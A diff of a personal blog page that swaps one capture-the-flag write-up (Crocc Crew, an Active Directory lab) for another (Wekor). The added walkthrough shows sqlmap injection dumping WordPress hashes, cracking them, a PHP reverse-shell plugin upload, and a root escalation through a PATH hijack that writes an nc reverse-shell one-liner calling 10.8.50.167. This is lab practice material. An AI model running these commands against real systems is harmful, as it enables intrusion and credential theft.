@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CTF Crocc Crew | Peanutstick</title>
+  <title>CTF Wekor | Peanutstick</title>
   <meta name="keywords" content=" Linux ">
-  <meta name="description" content="CTF Crocc Crew | Peanutstick">
+  <meta name="description" content="CTF Wekor | Peanutstick">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="nmapnmap -v -p- -sV 10.10.82.220 Output: PORT     STATE SERVICE VERSION 22&#x2F;tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) 80&#x2F;tcp   open  http    Apache httpd 2.4.41 (">
 <meta property="og:type" content="article">
@@ -1134,9 +1134,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Crocc Crew" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-CTF_Wekor" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">CTF Crocc Crew</h1>
+        <h1 class="article-title">CTF Wekor</h1>
     
     <div class="article-meta">
         
@@ -1161,12 +1161,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2022-12-23 08:28:45'>2022-12-23 08:02</time>
+            Created At : <time class="date" title='Updated At: 2023-02-19 00:03:58'>2023-03-19 04:57</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:402</span>
+        <span>Count:418</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1185,7 +1185,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-80"><span class="toc-text">Port 80</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-135"><span class="toc-text">Port 135</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-445"><span class="toc-text">Port 445</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-389"><span class="toc-text">Port 389</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#rustscan"><span class="toc-text">rustscan</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#robots-txt"><span class="toc-text">robots.txt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gobuster"><span class="toc-text">Gobuster</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-injection"><span class="toc-text">SQL injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Wordpress"><span class="toc-text">Wordpress</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Revershell"><span class="toc-text">Revershell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Upgrade-the-shell"><span class="toc-text">Upgrade the shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privesc"><span class="toc-text">Privesc</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privesc-to-root"><span class="toc-text">Privesc to root</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Other-solution-for-privesc"><span class="toc-text">Other solution for privesc.</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1201,75 +1201,86 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><pre class="line-numbers language-none"><code class="language-none">nmap -sV -A -T4 -Pn --min-rate 5000 10.10.130.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>-sV: Probe open ports to determine service/version info<br>-A: Enable OS detection, version detection, script scanning, and traceroute<br>-T&lt;0-5&gt;: Set timing template (higher is faster)<br>-Pn: Treat all hosts as online – skip host discovery</p>
-<p>Output:</p>
-<pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT     STATE SERVICE       VERSION
-53&#x2F;tcp   open  domain?
-80&#x2F;tcp   open  http          Microsoft IIS httpd 10.0
-|_http-server-header: Microsoft-IIS&#x2F;10.0
-| http-methods: 
-|_  Potentially risky methods: TRACE
-88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-23 07:06:51Z)
-135&#x2F;tcp  open  msrpc         Microsoft Windows RPC
-139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
-445&#x2F;tcp  open  microsoft-ds?
-464&#x2F;tcp  open  kpasswd5?
-593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636&#x2F;tcp  open  tcpwrapped
-3389&#x2F;tcp open  ms-wbt-server Microsoft Terminal Services
-| ssl-cert: Subject: commonName&#x3D;DC.COOCTUS.CORP
-| Not valid before: 2022-12-22T07:06:30
-|_Not valid after:  2023-06-23T07:06:30
-|_ssl-date: 2022-12-23T07:09:48+00:00; 0s from scanner time.
-| rdp-ntlm-info: 
-|   Target_Name: COOCTUS
-|   NetBIOS_Domain_Name: COOCTUS
-|   NetBIOS_Computer_Name: DC
-|   DNS_Domain_Name: COOCTUS.CORP
-|   DNS_Computer_Name: DC.COOCTUS.CORP
-|   Product_Version: 10.0.17763
-|_  System_Time: 2022-12-23T07:09:08+00:00
-Service Info: Host: DC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows
+        <h1 id="rustscan"><a href="#rustscan" class="headerlink" title="rustscan"></a>rustscan</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rustscan -a <span class="token number">10.10</span>.140.46<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-Host script results:
-| smb2-time: 
-|   date: 2022-12-23T07:09:12
-|_  start_date: N&#x2F;A
-| smb2-security-mode: 
-|   311: 
-|_    Message signing enabled and required<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Open 10.10.140.46:22<br>Open 10.10.140.46:80</p>
+<h1 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h1><pre class="line-numbers language-none"><code class="language-none">User-agent: *
+Disallow: &#x2F;workshop&#x2F;
+Disallow: &#x2F;root&#x2F;
+Disallow: &#x2F;lol&#x2F;
+Disallow: &#x2F;agent&#x2F;
+Disallow: &#x2F;feed
+Disallow: &#x2F;crawler
+Disallow: &#x2F;boot
+Disallow: &#x2F;comingreallysoon
+Disallow: &#x2F;interesting<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h1 id="Port-80"><a href="#Port-80" class="headerlink" title="Port 80"></a>Port 80</h1><p><code>http://10.10.130.135/</code><br>Ouptut:</p>
-<pre class="line-numbers language-text" data-language="text"><code class="language-text">User-Agent: *
-Disallow:
-&#x2F;robots.txt
-&#x2F;db-config.bak
-&#x2F;backdoor.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a href="http://10.10.140.46/comingreallysoon/">http://10.10.140.46/comingreallysoon/</a><br><img src="https://i.imgur.com/CYjGPvu.png"><br>So we found this website.<br><a href="http://10.10.140.46/it-next/">http://10.10.140.46/it-next/</a></p>
+<h1 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a>Gobuster</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://10.10.140.46/it-next/. -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/5eFoB6Z.png"></p>
+<h1 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h1><p>List of dbs</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u  http://10.10.140.46/it-next/it_cart.php --data<span class="token operator">=</span><span class="token string">"coupon_code=ghjghj&amp;apply_coupon=Apply+Coupon"</span> --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/f519sVu.png"></p>
+<p>List of tables</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u  http://10.10.140.46/it-next/it_cart.php --data<span class="token operator">=</span><span class="token string">"coupon_code=ghjghj&amp;apply_coupon=Apply+Coupon"</span> -D wordpress --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/VIQpJCQ.png"></p>
+<p>Dump the table wp_user</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u  http://10.10.140.46/it-next/it_cart.php --data<span class="token operator">=</span><span class="token string">"coupon_code=ghjghj&amp;apply_coupon=Apply+Coupon"</span> -D wordpress -T wp_users -dump <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><code>http://10.10.130.135/db-config.bak </code><br>Output:</p>
-<pre class="line-numbers language-text" data-language="text"><code class="language-text">&lt;?php
+<p><img src="https://i.imgur.com/6mRaA2l.png"></p>
+<p>Let’s put thoses hashes into a file and crack them.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$P</span><span class="token variable">$BoyfR2QzhNjRNmQZpva6TuuD0EE31B</span><span class="token builtin class-name">.</span>
+<span class="token variable">$P</span><span class="token variable">$BU8QpWD</span>.kHZv3Vd1r52ibmO913hmj10
+<span class="token variable">$P</span><span class="token variable">$B6jSC3m7WdMlLi1</span>/NDb3OFhqv536SV/
+<span class="token variable">$P</span><span class="token variable">$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY</span>/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-$servername &#x3D; &quot;db.cooctus.corp&quot;;
-$username &#x3D; &quot;C00ctusAdm1n&quot;;
-$password &#x3D; &quot;B4dt0th3b0n3&quot;;
 
-&#x2F;&#x2F; Create connection $conn &#x3D; new mysqli($servername, $username, $password);
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john hashs --wordlist<span class="token operator">=</span>/home/peanutstick/Documents/arch_doc/CTF/Wordlist/rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-&#x2F;&#x2F; Check connection if ($conn-&gt;connect_error) &#123;
-die (&quot;Connection Failed: &quot; .$conn-&gt;connect_error);
-&#125;
+<p><img src="https://i.imgur.com/dqfC9gm.png"><br>Login with wp_yura:soccer13</p>
+<h2 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h2><p><a href="http://site.wekor.thm/wordpress/">http://site.wekor.thm/wordpress/</a><br>You need to add it to your /etc/hosts<br><img src="https://i.imgur.com/ccKexW8.png"></p>
+<h1 id="Revershell"><a href="#Revershell" class="headerlink" title="Revershell"></a>Revershell</h1><p>With the plugin.<br><img src="https://i.imgur.com/CqwZvTo.png"><br>Then eip it:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">zip</span> rev.zip revershell.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Upgrade-the-shell"><a href="#Upgrade-the-shell" class="headerlink" title="Upgrade the shell"></a>Upgrade the shell</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 -c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span> 
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm <span class="token comment"># allow clear command</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-echo &quot;Connected Successfully&quot;;
+<p>Then <code>Ctrl + Z</code>.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stty raw -echo<span class="token punctuation">;</span> <span class="token function">fg</span> <span class="token comment"># allow auto completion</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Privesc"><a href="#Privesc" class="headerlink" title="Privesc"></a>Privesc</h1><p><img src="https://i.imgur.com/gwYpAuF.png"></p>
+<p>there is the tool memcached-tool in /usr/share/memcached/scripts.<br>we can dump what’s runing on the port 11211.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/share/memcached/scripts/memcached-tool localhost:11211 dump <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output.</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">Dumping bucket 1 - 5 total items
+add id 0 1676753794 4
+3476
+add username 0 1676753794 4
+Orka
+add salary 0 1676753794 8
+$100,000
+add password 0 1676753794 15
+OrkAiSC00L24&#x2F;7$
+add email 0 1676753794 14
+Orka@wekor.thm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-?&gt;%      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h1 id="Port-135"><a href="#Port-135" class="headerlink" title="Port 135"></a>Port 135</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rdesktop -u <span class="token string">""</span>  <span class="token number">10.10</span>.130.135 -g 1440x900<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>Output<br><img src="https://i.imgur.com/YbVljOg.png"></p>
-<h1 id="Port-445"><a href="#Port-445" class="headerlink" title="Port 445"></a>Port 445</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">10.10</span>.236.52<span class="token punctuation">\</span><span class="token punctuation">\</span>Home -U <span class="token string">"Visitor"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>Output:<br><img src="https://i.imgur.com/OE6V28k.png"><br>First flag in user.txt</p>
-<h1 id="Port-389"><a href="#Port-389" class="headerlink" title="Port 389"></a>Port 389</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -m ldapdomaindump <span class="token number">10.10</span>.130.135 -u <span class="token string">'COOCTUS.corp\Visitor'</span> -p <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>With the password OrkAiSC00L24/7$<br><img src="https://i.imgur.com/ckS4Dsk.png"></p>
+<h1 id="Privesc-to-root"><a href="#Privesc-to-root" class="headerlink" title="Privesc to root"></a>Privesc to root</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://i.imgur.com/J8qtKjB.png"><br>Let’s dig into this binary.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings /home/Orka/Desktop/bitcoin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/f5xmJVj.png"><br>He use python.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Orka@osboxes:~$ <span class="token function">ls</span> /usr/sbin/python
+ls: cannot access <span class="token string">'/usr/sbin/python'</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>Let’s create it.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"/usr/sbin:<span class="token environment constant">$PATH</span>"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&amp;1|nc 10.8.50.167 6666 >/tmp/f"</span> <span class="token operator">></span> /usr/sbin/python
+<span class="token function">chmod</span> +x /usr/sbin/python
+<span class="token function">sudo</span> Desktop/bitcoin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://i.imgur.com/naQI5JI.png"></p>
+<p>I’m root.<br><img src="https://i.imgur.com/sh397ey.png"></p>
+<h1 id="Other-solution-for-privesc"><a href="#Other-solution-for-privesc" class="headerlink" title="Other solution for privesc."></a>Other solution for privesc.</h1><p><img src="https://i.imgur.com/Tt3xeMp.png"></p>
+<p><img src="https://i.imgur.com/rSriPnz.png"></p>
 
       
        
